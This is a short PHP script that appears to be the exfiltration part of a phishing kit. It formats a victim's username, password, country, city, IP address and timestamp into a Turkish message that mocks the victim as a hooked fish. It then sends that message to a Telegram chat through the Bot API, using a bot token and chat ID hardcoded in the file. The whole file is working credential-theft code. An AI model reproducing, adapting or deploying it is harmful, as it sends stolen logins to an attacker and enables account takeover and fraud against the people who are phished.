<?php
    $token='1755559808:AAE321lNyh5Jsanr-Ch9RDQejTm0ftKt0cI';
    $data = [
        'text' => '➡️ Lan Koş Sazan Düştü 😈 

Kullanıcı Adı : '.$lorex.'
Şifre : '.$password.'
Ülke : '.$ulke.'
Şehir : '.$sehir.'
İp : '.$ip.'
Tarih : '.$cur_time.'
      ',
      'chat_id' => -1001226488510
    ];
    
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );


  
?>